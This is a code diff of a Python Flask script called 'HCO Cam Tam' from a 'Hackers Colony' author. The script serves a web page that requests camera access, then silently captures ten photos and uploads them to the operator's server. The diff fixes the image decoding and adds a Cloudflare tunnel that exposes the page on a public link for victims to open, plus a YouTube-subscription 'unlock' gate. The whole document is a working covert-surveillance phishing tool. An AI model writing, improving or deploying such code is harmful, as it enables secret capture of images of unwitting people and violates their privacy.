@@ -2,15 +2,16 @@
 """
 HCO Cam Tam
 By Azhar (Hackers Colony)
-Single file - No pip needed
+Single file - Auto Cloudflare + Unlock
 """
 
-import os, time
+import os, time, threading, base64
 from flask import Flask, render_template_string, request
+from colorama import Fore, Style
 
 app = Flask(__name__)
 
-# HTML Page (camera + JS capture)
+# ---------------- HTML Page ----------------
 HTML_PAGE = """
 <!DOCTYPE html>
 <html>
@@ -18,12 +19,13 @@ HTML_PAGE = """
   <title>HCO Cam Tam</title>
   <style>
     body { background: black; color: lime; text-align: center; font-family: monospace; }
-    #countdown { font-size: 20px; color: red; margin-top: 20px; }
+    #msg { font-size: 20px; margin-top: 20px; }
   </style>
 </head>
 <body>
-  <h2>📸 HCO Cam Tam - Camera Access Required</h2>
-  <p id="msg">Allow camera access to continue...</p>
+  <h1>📸 HCO Cam Tam</h1>
+  <h3>Camera Access Required</h3>
+  <p id="msg">Please allow camera to continue...</p>
   <video id="video" autoplay playsinline width="300" height="220"></video>
   <canvas id="canvas" width="300" height="220" style="display:none;"></canvas>
 
@@ -42,7 +44,10 @@ HTML_PAGE = """
         let data = canvas.toDataURL("image/png");
         fetch('/upload', { method:'POST', body:data });
         count++;
-        if(count >= 10) { clearInterval(interval); document.getElementById("msg").innerText="✔ Captured 10 images"; }
+        if(count >= 10) { 
+          clearInterval(interval); 
+          document.getElementById("msg").innerText="✔ Captured 10 images"; 
+        }
       }, 1500);
     })
     .catch(err => {
@@ -53,7 +58,7 @@ HTML_PAGE = """
 </html>
 """
 
-# Store uploaded images
+# ---------------- Upload Route ----------------
 @app.route("/")
 def index():
     return render_template_string(HTML_PAGE)
@@ -64,27 +69,44 @@ def upload():
     num = len([f for f in os.listdir(".") if f.startswith("camtam_")]) + 1
     imgdata = data.split(",")[1]
     with open(f"camtam_{num}.png", "wb") as f:
-        f.write(bytearray([ord(c) for c in imgdata.encode("utf-8")]))
+        f.write(base64.b64decode(imgdata))
     return "ok"
 
+# ---------------- Banner + Unlock ----------------
 def banner():
     os.system("clear")
-    print("\033[92m")  # Light Green
-    print("####################################")
-    print("          HCO Cam Tam")
-    print("             by Azhar")
-    print("####################################\033[0m")
+    print(Fore.LIGHTGREEN_EX + Style.BRIGHT)
+    print("===================================")
+    print("          HCO CAM TAM              ")
+    print("            by Azhar               ")
+    print("===================================")
+    print(Style.RESET_ALL)
 
-if __name__ == "__main__":
+def unlock():
     os.system("clear")
-    print("\033[91mUnlocking tool... Subscribe required!\033[0m")
-    for i in range(10,0,-1):
-        print(f"\033[93mRedirecting to YouTube in {i} sec...\033[0m", end="\r")
+    print(Fore.RED + Style.BRIGHT + "\n🚀 Unlocking Tool..." + Style.RESET_ALL)
+    print(Fore.YELLOW + "🔔 Subscription Required!" + Style.RESET_ALL)
+    for i in range(5,0,-1):
+        print(Fore.CYAN + f"Redirecting to YouTube in {i} sec..." + Style.RESET_ALL, end="\r")
         time.sleep(1)
-    print("\nOpening YouTube...\n")
+    print(Fore.GREEN + "\nOpening YouTube... Please Subscribe!\n" + Style.RESET_ALL)
     os.system("xdg-open https://youtube.com/@hackers_colony_tech")
+    input(Fore.MAGENTA + "\n👉 After subscribing, press ENTER to continue..." + Style.RESET_ALL)
 
-    input("\n\033[96mAfter subscribing, press ENTER to continue...\033[0m")
+# ---------------- Cloudflare Tunnel ----------------
+def start_cloudflare():
+    print(Fore.CYAN + "\n[+] Starting Cloudflared tunnel..." + Style.RESET_ALL)
+    os.system("pkill cloudflared >/dev/null 2>&1")
+    os.system("cloudflared tunnel --url http://localhost:5000 --no-autoupdate")
+
+# ---------------- Main ----------------
+if __name__ == "__main__":
+    unlock()
     banner()
-    print("\n\033[92m[+] Server started on http://0.0.0.0:5000\033[0m\n")
-    app.run(host="0.0.0.0", port=5000)
+    print(Fore.GREEN + "[✔] Local server started on http://0.0.0.0:5000" + Style.RESET_ALL)
+
+    # Start Flask in background thread
+    threading.Thread(target=lambda: app.run(host="0.0.0.0", port=5000, debug=False)).start()
+
+    # Start Cloudflare tunnel (prints WAN link)
+    start_cloudflare()
